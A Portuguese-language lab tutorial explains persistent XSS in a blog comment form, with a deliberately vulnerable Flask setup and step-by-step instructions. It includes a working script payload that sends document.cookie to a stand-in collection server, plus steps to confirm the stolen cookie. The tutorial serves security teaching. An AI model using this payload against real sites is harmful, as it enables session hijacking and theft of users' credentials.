# Estudo de Caso: Vulnerabilidade em Formulário de Comentários (Sugestão: Utilizar o SO Linux ou equivalentes)

# Ataque de XSS persistente:
Um ataque de XSS persistente ocorre quando um script malicioso é injetado e armazenado no servidor de um site vulnerável, como em um campo de comentário ou perfil de usuário, e é então executado no navegador de qualquer usuário que acesse o conteúdo afetado. Este tipo de ataque é também conhecido como XSS armazenado e é considerado o mais perigoso, pois não requer uma interação direta ou um link malicioso da vítima, podendo afetar muitos usuários sem que eles saibam, e o script malicioso pode roubar informações confidenciais ou tomar controle do navegador do usuário. 
Como funciona um ataque de XSS persistente

Injeção do código: Um invasor injeta um script malicioso (payload) em um campo de entrada de um site, como um fórum de mensagens, comentários de blogs ou perfis de usuários. 

Armazenamento: O script é então salvo permanentemente no servidor do site ou no banco de dados da aplicação web. 

Execução: Quando outros usuários visitam a página afetada, seus navegadores carregam o conteúdo com o script malicioso e o executam. 

Consequências
Roubo de dados: O script pode roubar cookies, credenciais de login ou outras informações sensíveis do usuário e enviá-las de volta ao invasor. 

Ataques mais amplos: Como o script é armazenado e executado automaticamente toda vez que a página é acessada, ele pode afetar um grande número de usuários simultaneamente. 

Comprometimento da sessão: Pode roubar o cookie de sessão do usuário, permitindo que o invasor tome controle da conta sem que a vítima precise fazer login. 

Exemplos de pontos de injeção 

Campos de comentários em um blog.

Perfis de usuários em redes sociais.

Fóruns de mensagens.

Campos de nome de usuário ou outros formulários de entrada.

Diferença para XSS refletido

Ao contrário de um ataque de XSS refletido, onde o script é enviado para a vítima através de um link malicioso e não é armazenado, um XSS persistente armazena o script, tornando-o um risco constante para qualquer usuário que visite a página. 

# Cenário:

Imagine uma aplicação de blog simples que permite aos usuários postar comentários em artigos. O formulário de comentários tem um campo de texto para o nome do usuário e outro para o conteúdo do comentário. O código do servidor recebe esses dados e os insere diretamente em uma página HTML que é exibida para outros usuários, sem qualquer tipo de validação ou sanitização.

Para executar o estudo de caso de vulnerabilidade em formulários de comentários e demonstrar o ataque de XSS persistente, você precisará simular o ambiente de uma aplicação web vulnerável.

A vulnerabilidade ocorre quando a aplicação não sanitiza a entrada do usuário antes de armazená-la no banco de dados e exibi-la para outros usuários.

# Passo 1: Simulação da Aplicação Vulnerável

Primeiro, você precisa de um código de servidor simples que tenha a vulnerabilidade. Usarei um exemplo em Python com o framework Flask, que é fácil de configurar.

Código Python (app.py):

Observação sobre a vulnerabilidade: A linha {{ comment | safe }} no template é intencionalmente vulnerável. O filtro | safe no Jinja2 (motor de template do Flask) desabilita a sanitização automática, fazendo com que o HTML injetado seja renderizado.

Executar: Precisa do python instalado 

(base) alex@iMac-de-Alex example_01 % python3 app.py 
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 647-019-061



# Passo 2: Configurando o Servidor de Coleta de Cookies

Para demonstrar o roubo de cookies, você precisa de um servidor que "colete" as requisições maliciosas. Rodar o arquivo .php em um servidor Web (Ex.: Apache)

Código PHP (coletar_cookie.php):

Este script simplesmente pega o valor do cookie da URL e o salva em um arquivo de texto no servidor.

# Passo 3: Execução do Ataque

Com os dois servidores prontos, siga os passos abaixo para realizar o ataque:

Inicie o servidor da aplicação vulnerável: Execute python app.py no seu terminal. Ele estará rodando em http://127.0.0.1:5000.

Inicie o servidor de coleta de cookies: Coloque o arquivo coletar_cookie.php em um servidor web (como Apache ou Nginx) ou use uma ferramenta de tunelamento como o ngrok para expor seu servidor local à internet. Anote a URL.

Acesse a página vulnerável em http://127.0.0.1:5000.

Crie a carga maliciosa: No campo de comentário, insira o seguinte script. Substitua http://seu-servidor-de-coleta.com pela URL do seu servidor Flask.

HTML
<script>
    document.write('<img src="http://seu-servidor-de-coleta.com/coletar_cookie.php?cookie=' + document.cookie + '">');
</script>

Envie o comentário: Clique em "Enviar". A página irá recarregar e exibir a mensagem de sucesso.

Verifique o ataque: Volte para a página inicial da aplicação (http://127.0.0.1:5000). O navegador, ao renderizar o comentário, executará o script. Ele tentará carregar a imagem, o que fará uma requisição GET para o seu servidor de coleta, enviando o cookie.

Confirme o sucesso: Verifique o seu servidor de coleta. O arquivo cookies_roubados.txt deve ter sido criado e conter o cookie roubado.
